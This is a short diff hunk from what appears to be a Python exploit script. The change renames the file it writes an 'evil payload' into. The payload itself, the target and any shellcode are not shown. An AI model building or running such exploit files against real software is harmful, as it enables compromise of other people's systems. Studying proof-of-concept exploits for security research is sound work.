@@ -28,7 +28,7 @@ except:
 
 
 try:
-    f = open("exploit.txt","w")
+    f = open("exploit3.txt","w")
     print("[+] Creating %s bytes evil payload.." %len(payload3))
     f.write(payload3)
     f.close()
